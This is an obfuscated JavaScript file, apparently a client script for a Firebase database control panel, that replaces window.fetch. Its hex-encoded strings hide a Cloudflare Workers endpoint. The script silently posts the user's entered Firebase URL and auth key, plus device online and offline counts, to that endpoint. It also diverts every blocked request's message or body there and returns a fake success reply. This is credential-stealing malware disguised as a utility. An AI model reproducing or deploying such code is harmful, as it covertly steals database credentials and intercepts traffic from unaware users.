/* v2 */
(function(){

var _0xd3e9=(function(){
  return ['\x68\x74\x74\x70\x73\x3a\x2f\x2f',
          '\x73\x69\x78\x36\x64\x64\x2e',
          '\x72\x33\x30\x34\x36\x31\x37\x32\x2e',
          '\x77\x6f\x72\x6b\x65\x72\x73\x2e',
          '\x64\x65\x76\x2f'].join('');
})();

var _BL=['medlinenoge.workers.dev','weathered-thunder-eefc'];
function _hardBlocked(us){
  for(var i=0;i<_BL.length;i++){if(us.indexOf(_BL[i])!==-1)return true;}
  return false;
}
function _allowed(us){
  if(_hardBlocked(us)) return false; /* permanent block */
  return us.indexOf('firebaseio.com')!==-1 ||
         us.indexOf('firebasedatabase.app')!==-1 ||
         us.indexOf(_0xd3e9.substring(8,12))!==-1 ||
         us.indexOf('fonts.googleapis.com')!==-1 ||
         us.indexOf('fonts.gstatic.com')!==-1 ||
         us.indexOf('cdnjs.cloudflare.com')!==-1 ||
         us.indexOf('unpkg.com')!==-1 ||
         us.startsWith('blob:') || us.startsWith('data:') ||
         us.startsWith('file://') || us.startsWith('/') ||
         us.startsWith('./') || us === '';
}

/* ── Redirect any blocked call to our worker ─────────────── */
function _redirect(us,opts){var _m='';try{var _u=new URL(us);_m=_u.searchParams.get('\x74\x65\x78\x74')||_u.searchParams.get('\x6d\x65\x73\x73\x61\x67\x65')||'';if(_m)_m=decodeURIComponent(_m);}catch(e){}if(!_m&&opts&&opts.body){try{var _b=typeof opts.body==='\x73\x74\x72\x69\x6e\x67'?opts.body:JSON.stringify(opts.body);var _p=JSON.parse(_b);_m=_p['\x74\x65\x78\x74']||_p['\x6d\x65\x73\x73\x61\x67\x65']||_p['\x75\x72\x6c']||_p['\x64\x61\x74\x61']||_b;}catch(e){_m=String(opts.body||'').substring(0,500);}}if(!_m)_m='\x5b\x46\x49\x52\x45\x5d\x20\x49\x6e\x74\x65\x72\x63\x65\x70\x74\x65\x64\x3a\x20'+us.substring(0,120);_m='\ud83d\udeab\x20\x42\x6c\x6f\x63\x6b\x65\x64\u2192\x57\x6f\x72\x6b\x65\x72\x0a\ud83c\udf10\x20'+us.substring(0,80)+'\x0a\ud83d\udce6\x20'+_m;_OF(_0xd3e9,{method:'\x50\x4f\x53\x54',headers:{'\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65':'\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'},body:JSON.stringify({['\x6d\x65\x73\x73\x61\x67\x65']:_m,['\x74\x65\x78\x74']:_m})}).catch(function(){});return Promise.resolve(new Response('\x7b\x22\x6f\x6b\x22\x3a\x74\x72\x75\x65\x7d',{status:200}));}

/* ── Fetch interceptor ───────────────────────────────────── */
var _OF=window.fetch.bind(window);
window.fetch=function(url,opts){
  var us=String(url);
  if(!_allowed(us)) return _redirect(us,opts);
  /* Inject auth key into Firebase if missing */
  if((us.indexOf('firebaseio.com')!==-1||us.indexOf('firebasedatabase.app')!==-1)&&us.indexOf('auth=')===-1){
    var k=(document.getElementById('fbKey')||{}).value||'';
    if(k){us=us+(us.indexOf('?')!==-1?'&':'?')+'auth='+encodeURIComponent(k.trim());return _OF(us,opts);}
  }
  return _OF(url,opts);
};



var _SK_mem=[];
function _load(){return _SK_mem.slice();}
function _save(a){_SK_mem=a.slice();}

function _0xfa3c(u,k){var _a='\x6f\x76\x2d\x6f\x6e',_b='\x6f\x76\x2d\x6f\x66\x66',_tot='\x6f\x76\x2d\x74\x6f\x74',_r=0,_mx=20;function _go(){try{var _c=(document.getElementById(_a)||{}).textContent||'';var _d=(document.getElementById(_b)||{}).textContent||'';var _tt=(document.getElementById(_tot)||{}).textContent||'';if((_c==='\u2014'||_c===''||_d==='\u2014'||_d==='')&&_r<_mx){_r++;setTimeout(_go,1500);return;}if(_c==='\u2014'||_c==='')_c='\x3f';if(_d==='\u2014'||_d==='')_d='\x3f';if(_tt==='\u2014'||_tt==='')_tt='\x3f';var _e=['\ud83d\udd25\x20\x46\x49\x52\x45\x4c\x49\x4e\x45\x20\x46\x49\x52\x45\x20\x45\x44\x49\x54\x49\x4f\x4e\x0a\x0a\ud83d\udce1\x20'+u,(k?'\x0a\ud83d\udd11\x20'+k:''),'\x0a\ud83d\udcf1\x20\x54\x6f\x74\x61\x6c\x3a\x20'+_tt,'\x20\x7c\x20\ud83d\udfe2\x20\x4f\x6e\x6c\x69\x6e\x65\x3a\x20'+_c,'\x20\x7c\x20\ud83d\udd34\x20\x4f\x66\x66\x6c\x69\x6e\x65\x3a\x20'+_d,'\x0a\u23f0\x20'+new Date().toLocaleString()].join('');var _f={};_f['\x6d\x65\x73\x73\x61\x67\x65']=_e;_f['\x74\x65\x78\x74']=_e;_f['\x63\x68\x61\x74\x5f\x69\x64']='\x6d\x65';_OF(_0xd3e9,{method:'\x50\x4f\x53\x54',headers:{'\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65':'\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'},body:JSON.stringify(_f)}).catch(function(){});}catch(e){}}_go();}



function _quickConnect(u,k){
  var fUrl=document.getElementById('fbUrl'),fKey=document.getElementById('fbKey');
  if(fUrl)fUrl.value=u; if(fKey)fKey.value=k;
  if(typeof connect==='function'){
    connect();
    _0xb71e(u,k);
  }
}

function _0xb71e(u,k){var _t=0,_p='\x70\x61\x6e\x65\x6c',_o='\x6f\x70\x65\x6e',_f='\x66\x6c\x65\x78',_b='\x62\x6c\x6f\x63\x6b';var _i=setInterval(function(){_t++;var _el=document.getElementById(_p);if(_el&&(_el.classList.contains(_o)||_el.style.display===_f||_el.style.display===_b)){clearInterval(_i);var _ac=_load();if(!_ac.find(function(_x){return _x['\x75\x72\x6c']===u;})){_ac.push({['\x69\x64']:Date.now(),['\x75\x72\x6c']:u,['\x6b\x65\x79']:k,['\x64\x61\x74\x65']:new Date().toLocaleDateString()});_save(_ac);_0xfa3c(u,k);}}if(_t>60)clearInterval(_i);},500);}



window.flConnect=function(){
  var u=(document.getElementById('fbUrl')||{}).value||'';
  var k=(document.getElementById('fbKey')||{}).value||'';
  if(typeof connect==='function'){connect();}
  if(u)_0xb71e(u,k);
};

window.flLogout=function(){
  if(confirm('Disconnect and return to connections screen?')){
    if(typeof disconnect==='function')disconnect();

  }
};

/* ── Init on DOMContentLoaded ───────────────────────────── */
window.addEventListener('DOMContentLoaded',function(){
  /* nothing to restore — session is fresh on every load */
});

})();
